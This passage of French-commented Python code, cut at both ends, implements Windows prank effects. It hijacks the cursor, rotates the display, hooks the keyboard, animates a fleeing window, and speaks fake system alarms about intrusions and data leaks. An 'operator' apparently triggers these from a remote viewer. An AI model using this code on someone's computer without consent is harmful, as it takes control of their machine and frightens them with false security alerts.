            root.after(0, _create)
        except Exception:
            pass

def _mouse_drift_loop():
    """
    Dérive de souris avec bonhomme cartoon musclé qui tire sur la souris avec une corde
    en fournissant un effort phénoménal (sueur, dents serrées, corps penché à 45°).
    """
    global mouse_drift_active, puller_state
    vx, vy = random.uniform(-6, 6), random.uniform(-6, 6)
    ensure_prank_overlays_started()
    
    while mouse_drift_active:
        try:
            x, y = _get_current_mouse_position()
            vx += random.uniform(-2.5, 2.5)
            vy += random.uniform(-2.5, 2.5)
            vx = max(-30, min(30, vx))
            vy = max(-30, min(30, vy))
            
            tx = int(x + vx)
            ty = int(y + vy)
            ctypes.windll.user32.SetCursorPos(tx, ty)
            
            puller_state["active"] = True
            puller_state["mx"] = tx
            puller_state["my"] = ty
            puller_state["dir_x"] = vx
            puller_state["dir_y"] = vy
            puller_state["force"] = math.hypot(vx, vy)
        except Exception:
            pass
        time.sleep(0.025)
        
    puller_state["active"] = False

def toggle_mouse_drift(active):
    global mouse_drift_active, puller_state
    if active and not mouse_drift_active:
        mouse_drift_active = True
        ensure_prank_overlays_started()
        threading.Thread(target=_mouse_drift_loop, daemon=True).start()
    elif not active:
        mouse_drift_active = False
        puller_state["active"] = False

# structures for ChangeDisplaySettingsExW / display rotation
class DEVMODEW(ctypes.Structure):
    _fields_ = [
        ("dmDeviceName", wintypes.WCHAR * 32),
        ("dmSpecVersion", wintypes.WORD),
        ("dmDriverVersion", wintypes.WORD),
        ("dmSize", wintypes.WORD),
        ("dmDriverExtra", wintypes.WORD),
        ("dmFields", wintypes.DWORD),
        # Display settings union branch (16 bytes)
        ("dmPositionX", ctypes.c_long),
        ("dmPositionY", ctypes.c_long),
        ("dmDisplayOrientation", wintypes.DWORD),
        ("dmDisplayFixedOutput", wintypes.DWORD),
        # Remaining fields
        ("dmColor", ctypes.c_short),
        ("dmDuplex", ctypes.c_short),
        ("dmYResolution", ctypes.c_short),
        ("dmTTOption", ctypes.c_short),
        ("dmCollate", ctypes.c_short),
        ("dmFormName", wintypes.WCHAR * 32),
        ("dmLogPixels", wintypes.WORD),
        ("dmBitsPerPel", wintypes.DWORD),
        ("dmPelsWidth", wintypes.DWORD),
        ("dmPelsHeight", wintypes.DWORD),
        ("dmDisplayFlags", wintypes.DWORD),
        ("dmDisplayFrequency", wintypes.DWORD),
        ("dmICMMethod", wintypes.DWORD),
        ("dmICMIntent", wintypes.DWORD),
        ("dmMediaType", wintypes.DWORD),
        ("dmDitherType", wintypes.DWORD),
        ("dmReserved1", wintypes.DWORD),
        ("dmReserved2", wintypes.DWORD),
        ("dmPanningWidth", wintypes.DWORD),
        ("dmPanningHeight", wintypes.DWORD),
    ]

def rotate_screen(rotation):
    """ rotation: 0 (default), 1 (90), 2 (180), 3 (270) """
    try:
        dm = DEVMODEW()
        dm.dmSize = ctypes.sizeof(DEVMODEW)
        success = ctypes.windll.user32.EnumDisplaySettingsW(None, -1, ctypes.byref(dm))
        if not success:
            return False
            
        current_orient = dm.dmDisplayOrientation
        if current_orient == rotation:
            return True
            
        is_current_landscape = (current_orient in (0, 2))
        is_new_landscape = (rotation in (0, 2))
        
        if is_current_landscape != is_new_landscape:
            dm.dmPelsWidth, dm.dmPelsHeight = dm.dmPelsHeight, dm.dmPelsWidth
            
        dm.dmDisplayOrientation = rotation
        dm.dmFields = 0x00000080 | 0x00080000 | 0x00100000
        res = ctypes.windll.user32.ChangeDisplaySettingsW(ctypes.byref(dm), 0)
        if res != 0:
            res = ctypes.windll.user32.ChangeDisplaySettingsW(ctypes.byref(dm), 1) # CDS_UPDATEREGISTRY
        return res == 0
    except Exception:
        return False

def get_open_windows():
    titles = []
    def enum_windows_callback(hwnd, extra):
        if ctypes.windll.user32.IsWindowVisible(hwnd):
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                title = buf.value
                if title and title not in ("BSOD", "Emergency Exit", "Alerte Système") and len(title.strip()) > 0:
                    titles.append(title)
        return True
    
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_callback), 0)
    return sorted(list(set(titles)))

def _get_target_window_hwnd(target_title=""):
    """
    Trouve la fenêtre cible soit par son titre (exact ou partiel insensible à la casse),
    soit par défaut en prenant la fenêtre actuellement active au premier plan,
    ou la première fenêtre utilisateur visible normale si le bureau est sélectionné.
    """
    found_hwnd = [None]
    target_clean = (target_title or "").strip().lower()
    
    # 1. Recherche par titre si spécifié
    if target_clean:
        def enum_windows_callback(hwnd, extra):
            if ctypes.windll.user32.IsWindowVisible(hwnd) and not ctypes.windll.user32.IsIconic(hwnd):
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                if length > 0:
                    buf = ctypes.create_unicode_buffer(length + 1)
                    ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                    val = buf.value
                    if val:
                        val_lower = val.lower()
                        if val_lower == target_clean or target_clean in val_lower or val_lower in target_clean:
                            found_hwnd[0] = hwnd
                            return False
            return True
        
        EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
        ctypes.windll.user32.EnumWindows(EnumWindowsProc(enum_windows_callback), 0)
        if found_hwnd[0] and ctypes.windll.user32.IsWindow(found_hwnd[0]):
            return found_hwnd[0]
            
    # 2. Fallback : fenêtre active au premier plan (Foreground Window)
    fg = ctypes.windll.user32.GetForegroundWindow()
    if fg and ctypes.windll.user32.IsWindow(fg) and ctypes.windll.user32.IsWindowVisible(fg) and not ctypes.windll.user32.IsIconic(fg):
        cls_buf = ctypes.create_unicode_buffer(256)
        ctypes.windll.user32.GetClassNameW(fg, cls_buf, 256)
        cls_name = cls_buf.value
        if cls_name not in ("Shell_TrayWnd", "Progman", "WorkerW"):
            return fg

    # 3. Fallback supplémentaire : chercher la première fenêtre utilisateur visible normale
    top_user_window = [None]
    def find_top_cb(hwnd, _):
        if ctypes.windll.user32.IsWindowVisible(hwnd) and not ctypes.windll.user32.IsIconic(hwnd):
            length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            if length > 0:
                cls_buf = ctypes.create_unicode_buffer(256)
                ctypes.windll.user32.GetClassNameW(hwnd, cls_buf, 256)
                cls_name = cls_buf.value
                if cls_name not in ("Shell_TrayWnd", "Progman", "WorkerW", "Windows.UI.Core.CoreWindow"):
                    top_user_window[0] = hwnd
                    return False
        return True
    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_int, ctypes.c_int)
    ctypes.windll.user32.EnumWindows(EnumWindowsProc(find_top_cb), 0)
    if top_user_window[0] and ctypes.windll.user32.IsWindow(top_user_window[0]):
        return top_user_window[0]
            
    return None

def _find_hwnd_by_title(target_title):
    return _get_target_window_hwnd(target_title)

# --- Boucles d'exécution des nouveaux trolls ---

def _drunk_mouse_loop():
    """
    Souris ivre avec animation cartoon :
    1. Boit de l'alcool dans une bouteille réaliste au démarrage (~2.2s).
    2. Dès qu'elle est ivre, elle ARRÊTE de boire : plus de bouteille, sa tête tourne avec des étoiles en orbite.
    """
    global drunk_mouse_active, drunk_state
    t = 0.0
    start_time = time.time()
    ensure_prank_overlays_started()
    drunk_state["intro_reset"] = True
    
    while drunk_mouse_active:
        try:
            x, y = _get_current_mouse_position()
            elapsed = time.time() - start_time
            is_drinking = (elapsed < 2.2)
            drunk_state["drinking"] = is_drinking
            
            if is_drinking:
                # Phase 1 : dégustation à la bouteille, tremblements de gorgées
                sip_x = int(math.sin(t * 8.0) * 2.0)
                sip_y = int(math.cos(t * 8.0) * 2.0)
                target_x = x + sip_x
                target_y = y + sip_y
            else:
                # Phase 2 : elle est ivre, a arrêté de boire ! Vacillements et tête qui tourne
                stagger_x = int(math.sin(t * 1.5) * 16.0 + math.cos(t * 0.7) * 8.0)
                stagger_y = int(math.cos(t * 1.3) * 12.0 + math.sin(t * 0.8) * 6.0)
                if random.random() < 0.05:
                    stagger_x += random.choice([-18, 18])
                    stagger_y += random.choice([-10, 10])
                target_x = x + stagger_x
                target_y = y + stagger_y
                
            sw = ctypes.windll.user32.GetSystemMetrics(0)
            sh = ctypes.windll.user32.GetSystemMetrics(1)
            target_x = max(10, min(sw - 10, target_x))
            target_y = max(10, min(sh - 10, target_y))
            
            ctypes.windll.user32.SetCursorPos(target_x, target_y)
            drunk_state["active"] = True
            drunk_state["mx"] = target_x
            drunk_state["my"] = target_y
                
            t += 0.22
        except Exception:
            pass
        time.sleep(0.035)
        
    drunk_state["active"] = False
    drunk_state["drinking"] = False

def toggle_drunk_mouse(active):
    global drunk_mouse_active, drunk_state
    if active and not drunk_mouse_active:
        drunk_mouse_active = True
        ensure_prank_overlays_started()
        threading.Thread(target=_drunk_mouse_loop, daemon=True).start()
    elif not active:
        drunk_mouse_active = False
        drunk_state["active"] = False
        drunk_state["drinking"] = False

def _invisible_wall_loop():
    """
    Mur invisible cartoon avec des yeux expressifs qui suivent le curseur,
    un sourire malicieux et un impact cartoon 'BONK!' quand la souris tente de passer.
    """
    global invisible_wall_active, wall_state
    ensure_prank_overlays_started()
    try:
        sw = ctypes.windll.user32.GetSystemMetrics(0)
    except Exception:
        sw = 1920
    wall_x = sw // 2
    wall_state["wall_x"] = wall_x
    wall_state["active"] = True
    
    while invisible_wall_active:
        try:
            x, y = _get_current_mouse_position()
            is_bonk = False
            if x > wall_x - 5:
                is_bonk = True
                ctypes.windll.user32.SetCursorPos(wall_x - 5, y)
                
            wall_state["active"] = True
            wall_state["mx"] = min(wall_x - 5, x)
            wall_state["my"] = y
            wall_state["is_bonking"] = is_bonk
        except Exception:
            pass
        time.sleep(0.015)
        
    wall_state["active"] = False

def toggle_invisible_wall(active):
    global invisible_wall_active, wall_state
    if active and not invisible_wall_active:
        invisible_wall_active = True
        ensure_prank_overlays_started()
        threading.Thread(target=_invisible_wall_loop, daemon=True).start()
    elif not active:
        invisible_wall_active = False
        wall_state["active"] = False

def toggle_dead_pixels(active):
    """
    Remplace les pixels morts par un petit bonhomme cartoon qui sort à moitié de l'écran,
    rigole et balance des pinceaux qui s'écrasent et salissent tout l'écran avec des éclaboussures
    et coulures de peinture colorées en 3D cartoon !
    """
    global dead_pixels_active, painter_state
    if active and not dead_pixels_active:
        dead_pixels_active = True
        painter_state["active"] = True
        ensure_prank_overlays_started()
    elif not active:
        dead_pixels_active = False
        painter_state["active"] = False

def toggle_prank_keys(active):
    """
    Touches folles cartoon : lutin farceur qui martèle un mini clavier
    et projette des touches rebondissantes sur ressorts avec des étoiles comiques.
    """
    global prank_keys_active, keys_state
    if active and not prank_keys_active:
        prank_keys_active = True
        keys_state["active"] = True
        ensure_prank_overlays_started()
        update_hooks_state()
    elif not active:
        prank_keys_active = False
        keys_state["active"] = False
        update_hooks_state()

def _ghost_sounds_loop():
    """
    Poltergeist cartoon interactif plein écran :
    Émet des glissandos sonores spectraux, coordonné avec le fantôme qui hante l'écran.
    """
    global ghost_sounds_active, ghost_state, ghost_overlay_instance
    while ghost_sounds_active:
        time.sleep(random.uniform(2.5, 4.5))
        if not ghost_sounds_active:
            break
        try:
            if ghost_overlay_instance and ghost_overlay_instance.state != "JUMPSCARE":
                ghost_overlay_instance.trigger_booh()
            notes = [random.choice([800, 1100, 1400, 1800]), random.choice([350, 450, 550])]
            if HAS_WINSOUND:
                for f in notes:
                    if not ghost_sounds_active:
                        break
                    winsound.Beep(f, 180)
                    time.sleep(0.05)
        except Exception:
            pass

def toggle_ghost_sounds(active):
    """
    Active ou désactive le fantôme farceur cartoon et ses sons spectraux.
    """
    global ghost_sounds_active, ghost_state
    if active and not ghost_sounds_active:
        ghost_sounds_active = True
        ghost_state["active"] = True
        ensure_prank_overlays_started()
        threading.Thread(target=_ghost_sounds_loop, daemon=True).start()
    elif not active:
        ghost_sounds_active = False
        ghost_state["active"] = False

def _system_tts_loop():
    """
    Mégaphone d'alerte cartoon vivant avec sirène de police rotative, gants de cartoon
    et mégaphone crachant des ondes acoustiques et des phrases d'alerte système.
    """
    global system_tts_active, tts_state
    phrases = [
        "Alerte, anomalie critique detectee.",
        "Calibrage du processeur en cours.",
        "Erreur memoire sur le secteur 4.",
        "Attention, surcharge thermique imminente.",
        "Intrusion detectee dans le terminal.",
        "Tentative de fuite de donnees interceptee."
    ]
    while system_tts_active:
        time.sleep(random.uniform(4.0, 7.5))
        if not system_tts_active:
            break
        try:
            phrase = random.choice(phrases)
            tts_state["text"] = phrase
            tts_state["is_speaking"] = True
            vbs_script = f'CreateObject("SAPI.SpVoice").Speak "{phrase}"'
            subprocess.run(["cscript", "//Nologo", "/e:VBScript", "-"], input=vbs_script, text=True, capture_output=True)
            tts_state["is_speaking"] = False
        except Exception:
            tts_state["is_speaking"] = False

def toggle_system_tts(active):
    """
    Active ou désactive le mégaphone d'alerte cartoon et ses annonces vocales SAPI.
    """
    global system_tts_active, tts_state
    if active and not system_tts_active:
        system_tts_active = True
        tts_state["active"] = True
        ensure_prank_overlays_started()
        threading.Thread(target=_system_tts_loop, daemon=True).start()
    elif not active:
        system_tts_active = False
        tts_state["active"] = False
        tts_state["is_speaking"] = False

def toggle_screen_rotate(active):
    """
    Bascule 180° : ouvrier cartoon tirant le levier industriel à engrenages,
    inversion physique de gravité de la souris (up=down, left=right) et bascule d'affichage.
    """
    global screen_rotate_active, rotate_state, rotate_last_phys_x, rotate_last_phys_y
    if active and not screen_rotate_active:
        screen_rotate_active = True
        rotate_state["active"] = True
        rotate_last_phys_x = None
        rotate_last_phys_y = None
        ensure_prank_overlays_started()
        update_hooks_state()
        rotate_screen(2) # 180 degrees inversion
    elif not active:
        screen_rotate_active = False
        rotate_state["active"] = False
        rotate_last_phys_x = None
        rotate_last_phys_y = None
        update_hooks_state()
        rotate_screen(0) # restore normal

# ==============================================================================
# JAMBES ANIMÉES CARTOON POUR LA FENÊTRE FUYANTE
# ==============================================================================
legs_state = {
    "active": False,
    "target_cx": 0,
    "target_bottom": 0,
    "is_moving": False,
    "dir_x": 1.0,
    "dir_y": 0.0,
    "speed": 0.0
}
legs_overlay_instance = None

class ElusiveWindowLegsOverlay:
    """
    Jambes cartoon ultra-détaillées sous la fenêtre fuyante :
    - Modèle 2D cartoon riche :
      * Plaque de fixation métallique rivetée sous le cadre inférieur de la fenêtre
      * Cuisses et mollets en jeans bleu athlétique galbé avec coutures, reflets et genouillères
      * Chaussettes montantes de sport blanches à rayures rétro rouge et bleu
      * Grosses sneakers montantes de basket cartoon rouges, blanches et noires (style Air Jordan / All-Star)
      * Semelles épaisses en caoutchouc blanc cranté avec bande noire
      * Écussons étoile sur les chevilles et lacets dynamiques avec nœud papillon flottant
    - Animation de course cinématique avancée :
      * Cycle de sprint biomécanique en 4 phases (impact, flexion amortie, impulsion explosive, genou haut)
      * Poussière cartoon expansée à plusieurs lobes sous les semelles
      * Lignes de vitesse aérodynamiques cartoon projetées en arrière
      * Posture d'attente (idle) dynamique avec trépignement impatient et tapotement de pied
    """
    def __init__(self, master):
        self.master = master
        self.win = tk.Toplevel(master)
        self.win.overrideredirect(True)
        self.win.attributes("-topmost", True)
        self.win.attributes("-transparentcolor", "#010101")
        self.win.configure(bg="#010101")
        self.win.withdraw()
        
        self.w, self.h = 320, 125
        self.canvas = tk.Canvas(self.win, width=self.w, height=self.h, bg="#010101", highlightthickness=0)
        self.canvas.pack(fill="both", expand=True)
        
        try:
            self.win.update_idletasks()
            self.hwnd = ctypes.windll.user32.GetParent(self.win.winfo_id()) or self.win.winfo_id()
            ex = ctypes.windll.user32.GetWindowLongW(self.hwnd, -20)
            ctypes.windll.user32.SetWindowLongW(
                self.hwnd, -20,
                ex | 0x00080000 | 0x00000020 | 0x00000080 | 0x08000000
            )
        except Exception:
            self.hwnd = None
            
        self.last_px = None
        self.last_py = None
        self.phase = 0.0
        self.facing = 1.0
        self.visible = False
        self.dust_clouds = []
        self._loop_active = True
        self._tick()
        
    def _tick(self):
        if not self._loop_active:
            return
        try:
            global legs_state
            if legs_state.get("active", False):
                if not self.visible:
                    self.visible = True
                    self.win.deiconify()
                    self.win.lift()
                    
                tcx = legs_state.get("target_cx", 0)
                tbot = legs_state.get("target_bottom", 0)
                is_moving = legs_state.get("is_moving", False)
                dx = legs_state.get("dir_x", 1.0)
                speed = legs_state.get("speed", 0.0)
                
                if abs(dx) > 0.05:
                    self.facing = 1.0 if dx > 0 else -1.0
                    
                if is_moving:
                    self.phase += max(0.24, min(0.38, speed * 0.02))
                    if len(self.dust_clouds) < 10 and (random.random() < 0.38):
                        cloud_x = (self.w // 2) - self.facing * (35 + random.uniform(5, 20))
                        cloud_y = self.h - 18 + random.uniform(-4, 4)
                        self.dust_clouds.append({
                            "x": cloud_x, "y": cloud_y,
                            "r": random.uniform(6, 11),
                            "vx": -self.facing * random.uniform(1.2, 3.2),
                            "vy": random.uniform(-1.0, -0.2),
                            "life": 1.0
                        })
                else:
                    self.phase += 0.08
                    
                px = int(tcx - (self.w // 2))
                py = int(tbot - 12)
                if (px, py) != (self.last_px, self.last_py):
                    self.last_px = px
                    self.last_py = py
                    if self.hwnd:
                        ctypes.windll.user32.SetWindowPos(
                            self.hwnd, 0, px, py, 0, 0,
                            0x0001 | 0x0004 | 0x0010
                        )
                    else:
                        self.win.geometry(f"{self.w}x{self.h}+{px}+{py}")
                        
                self._draw(is_moving, speed)
            else:
                if self.visible:
                    self.visible = False
                    self.win.withdraw()
                    self.dust_clouds.clear()
                    self.last_px = None
                    self.last_py = None
        except Exception:
            pass
            
        if self.master:
            self.master.after(16, self._tick)

    def _draw_sneaker(self, fx, fy, facing, angle_deg, is_planted=False, scale=1.0):
        """Dessine une sneaker de basket cartoon ultra-détaillée."""
        rad = math.radians(angle_deg)
        cos_a = math.cos(rad)
        sin_a = math.sin(rad)
        
        def rot(px, py):
            lx = px * facing
            ly = py
            rx = fx + (lx * cos_a - ly * sin_a) * scale
            ry = fy + (lx * sin_a + ly * cos_a) * scale
            return rx, ry
            
        # 1. Chaussette montante avec rayures rétro rouge/bleu
        sock_pts = [rot(-8, -14), rot(7, -14), rot(6, -2), rot(-7, -2)]
        self.canvas.create_polygon(sock_pts, fill="#ffffff", outline="#0f172a", width=2)
        s1a, s1b = rot(-8, -10), rot(7, -10)
        s2a, s2b = rot(-7, -7), rot(6, -7)
        self.canvas.create_line(s1a[0], s1a[1], s1b[0], s1b[1], fill="#ef4444", width=2)
        self.canvas.create_line(s2a[0], s2a[1], s2b[0], s2b[1], fill="#2563eb", width=2)

        # 2. Corps de la sneaker (chaussure montante)
        body_pts = [
            rot(-12, -4),   # Haut talon
            rot(6, -4),     # Haut languette
            rot(14, 2),     # Coup-de-pied
            rot(26, 6),     # Dessus orteils
            rot(28, 14),    # Bout avant semelle
            rot(-13, 14),   # Bout arrière semelle
            rot(-14, 4)     # Talon médian
        ]
        self.canvas.create_polygon(body_pts, fill="#dc2626", outline="#0f172a", width=2.5)
        
        # 3. Empiècement noir contrasté de sport à l'arrière
        heel_pts = [rot(-14, 4), rot(-12, -4), rot(-4, -4), rot(-4, 14), rot(-13, 14)]
        self.canvas.create_polygon(heel_pts, fill="#1e293b", outline="#0f172a", width=1.5)

        # 4. Patch logo circulaire avec étoile sur la cheville
        patch_cx, patch_cy = rot(-2, 2)
        pr = 4.5 * scale
        self.canvas.create_oval(patch_cx - pr, patch_cy - pr, patch_cx + pr, patch_cy + pr, fill="#ffffff", outline="#0f172a", width=1.5)
        self.canvas.create_text(patch_cx, patch_cy, text="★", font=("Arial", max(4, int(5 * scale)), "bold"), fill="#dc2626")

        # 5. Embout en caoutchouc blanc protecteur à l'avant
        toe_pts = [rot(18, 5), rot(26, 6), rot(28, 14), rot(18, 14)]
        self.canvas.create_polygon(toe_pts, fill="#f8fafc", outline="#0f172a", width=2)

        # 6. Semelle épaisse blanche crantée (caoutchouc)
        sole_pts = [rot(-13, 11), rot(28, 11), rot(27, 16), rot(-12, 16)]
        self.canvas.create_polygon(sole_pts, fill="#f8fafc", outline="#0f172a", width=2)
        s_line1, s_line2 = rot(-12, 13.5), rot(27, 13.5)
        self.canvas.create_line(s_line1[0], s_line1[1], s_line2[0], s_line2[1], fill="#0f172a", width=1.5)

        # 7. Lacets blancs croisés et nœud papillon dynamique
        for ly in [-1, 2, 5]:
            l1, l2 = rot(3, ly), rot(13, ly + 2)
            self.canvas.create_line(l1[0], l1[1], l2[0], l2[1], fill="#ffffff", width=2)
            
        bow_c = rot(6, -3)
        loop1 = rot(2, -9 - math.sin(self.phase * 3.0) * 3)
        loop2 = rot(14, -7 + math.cos(self.phase * 3.0) * 3)
        self.canvas.create_line(bow_c[0], bow_c[1], loop1[0], loop1[1], fill="#ffffff", width=2, capstyle=tk.ROUND)
        self.canvas.create_line(bow_c[0], bow_c[1], loop2[0], loop2[1], fill="#ffffff", width=2, capstyle=tk.ROUND)

    def _draw(self, is_moving, speed):
        self.canvas.delete("all")
        cx = self.w // 2
        cy = 12
        
        # 0. Support d'accroche cartoon sous la fenêtre (plaque en métal boulonnée)
        bracket_w = 110
        bracket_h = 8
        self.canvas.create_rectangle(cx - bracket_w//2, cy - bracket_h, cx + bracket_w//2, cy, fill="#334155", outline="#0f172a", width=2)
        for rx in [-44, -22, 0, 22, 44]:
            self.canvas.create_oval(cx + rx - 2, cy - 6, cx + rx + 2, cy - 2, fill="#94a3b8", outline="#0f172a", width=1)
            
        # 1. Nuages de poussière cartoon à lobes
        new_clouds = []
        for c in self.dust_clouds:
            c["x"] += c["vx"]
            c["y"] += c["vy"]
            c["r"] += 0.8
            c["life"] -= 0.06
            if c["life"] > 0:
                alpha_col = "#e2e8f0" if c["life"] > 0.6 else ("#cbd5e1" if c["life"] > 0.3 else "#94a3b8")
                r = c["r"]
                self.canvas.create_oval(c["x"] - r, c["y"] - r*0.7, c["x"] + r, c["y"] + r*0.7, fill=alpha_col, outline="")
                self.canvas.create_oval(c["x"] - r*0.5, c["y"] - r*0.9, c["x"] + r*0.3, c["y"] - r*0.2, fill=alpha_col, outline="")
                new_clouds.append(c)
        self.dust_clouds = new_clouds
        
        # 2. Lignes de vitesse aérodynamiques cartoon
        if is_moving:
            for l in range(3):
                streak_y = cy + 40 + l * 18
                streak_start = cx - self.facing * (45 + l * 10)
                streak_len = 32 + math.sin(self.phase * 2.0 + l) * 14
                streak_end = streak_start - self.facing * streak_len
                self.canvas.create_line(streak_start, streak_y, streak_end, streak_y, fill="#94a3b8", width=2, dash=(4, 3))

        # 3. Jambes cartoon articulées
        leg_spacing = 32
        offsets = [-leg_spacing, leg_spacing]
        
        if is_moving:
            # Cycle complet de course biomécanique cartoon
            for i in [1, 0]: # arrière-plan puis premier plan
                leg_idx = i
                offset = offsets[leg_idx]
                leg_phase = self.phase + (math.pi if leg_idx == 1 else 0.0)
                
                hip_bob = math.sin(self.phase * 2.0) * 3.5
                hip_x = cx + offset * 0.75 + (self.facing * math.sin(self.phase) * 5.0)
                hip_y = cy + hip_bob
                
                sin_p = math.sin(leg_phase)
                cos_p = math.cos(leg_phase)
                
                stride_x = sin_p * 40.0 * self.facing
                
                if cos_p > 0:
                    lift_y = cos_p * 30.0
                    foot_angle = -self.facing * (15.0 + cos_p * 26.0)
                else:
                    lift_y = 0.0
                    foot_angle = self.facing * (abs(cos_p) * 25.0)
                    
                knee_x = hip_x + (stride_x * 0.5) + (self.facing * (14.0 - abs(sin_p)*3.5))
                knee_y = hip_y + 34.0 - (lift_y * 0.45)
                
                foot_x = hip_x + stride_x
                foot_y = hip_y + 76.0 - lift_y
                
                jean_main = "#2563eb" if leg_idx == 0 else "#1d4ed8"
                jean_dark = "#0f172a"
                jean_light = "#60a5fa" if leg_idx == 0 else "#3b82f6"
                
                # Cuisse
                self.canvas.create_line(hip_x, hip_y, knee_x, knee_y, fill=jean_dark, width=15, capstyle=tk.ROUND)
                self.canvas.create_line(hip_x, hip_y, knee_x, knee_y, fill=jean_main, width=10, capstyle=tk.ROUND)
                self.canvas.create_line(hip_x + self.facing*2, hip_y + 2, knee_x + self.facing*2, knee_y - 2, fill=jean_light, width=2.5, capstyle=tk.ROUND)
                
                # Genouillère
                self.canvas.create_oval(knee_x - 6.5, knee_y - 6.5, knee_x + 6.5, knee_y + 6.5, fill=jean_main, outline=jean_dark, width=2)
                self.canvas.create_oval(knee_x - 3.5, knee_y - 3.5, knee_x + 2, knee_y + 2, fill=jean_light, outline="")
                
                # Mollet
                self.canvas.create_line(knee_x, knee_y, foot_x, foot_y, fill=jean_dark, width=12, capstyle=tk.ROUND)
                self.canvas.create_line(knee_x, knee_y, foot_x, foot_y, fill=jean_main, width=7.5, capstyle=tk.ROUND)
                
                # Ourlet de jean retroussé
                cuff_dx = self.facing * 3
                self.canvas.create_oval(foot_x - 7.5 + cuff_dx, foot_y - 7, foot_x + 7.5 + cuff_dx, foot_y + 1, fill="#93c5fd", outline=jean_dark, width=2)
                
                # Sneaker
                self._draw_sneaker(foot_x, foot_y, self.facing, foot_angle, is_planted=(lift_y < 2.0), scale=0.95 if leg_idx == 1 else 1.05)
                
        else:
            # Posture d'attente (idle dynamique avec trépignement impatient)
            breath = math.sin(self.phase * 3.0) * 1.8
            tap_phase = math.sin(self.phase * 8.0)
            
            for leg_idx in [1, 0]:
                offset = offsets[leg_idx]
                hip_x = cx + offset
                hip_y = cy + breath
                
                if leg_idx == 0:
                    is_tapping = tap_phase > 0.3
                    toe_lift = tap_phase * 10.0 if is_tapping else 0.0
                    knee_x = hip_x + (self.facing * 7.0)
                    knee_y = hip_y + 34.0 - (toe_lift * 0.2)
                    foot_x = hip_x + (self.facing * 10.0)
                    foot_y = hip_y + 76.0 - toe_lift
                    foot_angle = -self.facing * (toe_lift * 2.5)
                else:
                    knee_x = hip_x - (self.facing * 5.0)
                    knee_y = hip_y + 35.0
                    foot_x = hip_x - (self.facing * 7.0)
                    foot_y = hip_y + 76.0
                    foot_angle = self.facing * 4.0
                    
                jean_main = "#2563eb" if leg_idx == 0 else "#1d4ed8"
                jean_dark = "#0f172a"
                jean_light = "#60a5fa" if leg_idx == 0 else "#3b82f6"
                
                # Cuisse
                self.canvas.create_line(hip_x, hip_y, knee_x, knee_y, fill=jean_dark, width=15, capstyle=tk.ROUND)
                self.canvas.create_line(hip_x, hip_y, knee_x, knee_y, fill=jean_main, width=10, capstyle=tk.ROUND)
                self.canvas.create_line(hip_x + self.facing*2, hip_y + 2, knee_x + self.facing*2, knee_y - 2, fill=jean_light, width=2.5, capstyle=tk.ROUND)
                
                # Genou
                self.canvas.create_oval(knee_x - 6.5, knee_y - 6.5, knee_x + 6.5, knee_y + 6.5, fill=jean_main, outline=jean_dark, width=2)
                
                # Mollet
                self.canvas.create_line(knee_x, knee_y, foot_x, foot_y, fill=jean_dark, width=12, capstyle=tk.ROUND)
                self.canvas.create_line(knee_x, knee_y, foot_x, foot_y, fill=jean_main, width=7.5, capstyle=tk.ROUND)
                
                # Ourlet
                self.canvas.create_oval(foot_x - 7.5, foot_y - 7, foot_x + 7.5, foot_y + 1, fill="#93c5fd", outline=jean_dark, width=2)
                
                # Sneaker
                self._draw_sneaker(foot_x, foot_y, self.facing, foot_angle, is_planted=True, scale=0.95 if leg_idx == 1 else 1.05)

def ensure_legs_overlay_started():
    global legs_overlay_instance, root
    if legs_overlay_instance is None and root:
        try:
            def _create():
                global legs_overlay_instance, root
                if legs_overlay_instance is None and root:
                    legs_overlay_instance = ElusiveWindowLegsOverlay(root)
            root.after(0, _create)
        except Exception:
            pass

def _elusive_window_loop():
    """
    Boucle de fuite de la fenêtre avec jambes animées en sprint.
    Reste active en permanence tant que l'opérateur ne la désactive pas depuis le viewer.
    Si la fenêtre ciblée est fermée, le script cible immédiatement la prochaine fenêtre active.
    """
    global elusive_window_active, elusive_window_title, legs_state
    current_hwnd = None
    ensure_legs_overlay_started()
    
    while elusive_window_active:
        try:
            # 1. Vérifier la validité de la fenêtre actuelle, ou en acquérir une nouvelle
            if not current_hwnd or not ctypes.windll.user32.IsWindow(current_hwnd) or not ctypes.windll.user32.IsWindowVisible(current_hwnd) or ctypes.windll.user32.IsIconic(current_hwnd):
                current_hwnd = _get_target_window_hwnd(elusive_window_title)
                if not current_hwnd:
                    legs_state["active"] = False
                    time.sleep(0.08)
                    continue

            # 2. Si la fenêtre est maximisée, la restaurer en taille normale pour permettre le déplacement
            if ctypes.windll.user32.IsZoomed(current_hwnd):
                ctypes.windll.user32.ShowWindow(current_hwnd, 9)  # SW_RESTORE
                time.sleep(0.04)

            # 3. Récupérer les coordonnées de la fenêtre
            rect = wintypes.RECT()
            if not ctypes.windll.user32.GetWindowRect(current_hwnd, ctypes.byref(rect)):
                current_hwnd = None
                legs_state["active"] = False
                time.sleep(0.05)
                continue

            w_left, w_top, w_right, w_bottom = rect.left, rect.top, rect.right, rect.bottom
            w_width = w_right - w_left
            w_height = w_bottom - w_top
            if w_width <= 0 or w_height <= 0:
                legs_state["active"] = False
                time.sleep(0.05)
                continue

            cx = w_left + (w_width // 2)
            cy = w_top + (w_height // 2)
            bottom = w_bottom

            # Rendre les jambes visibles et les positionner sous la fenêtre
            legs_state["active"] = True

            mx, my = _get_current_mouse_position()
            padding = 110  # Zone de danger autour de la fenêtre

            try:
                sw = ctypes.windll.user32.GetSystemMetrics(0)
                sh = ctypes.windll.user32.GetSystemMetrics(1)
            except Exception:
                sw, sh = 1920, 1080

            margin = 10
            min_x = margin
            max_x = max(margin, sw - w_width - margin)
            min_y = margin
            max_y = max(margin, sh - w_height - 95)  # Espace réservé pour les jambes au-dessus de la barre des tâches

            # 4. Fuite active par foulées de course dès que la souris approche
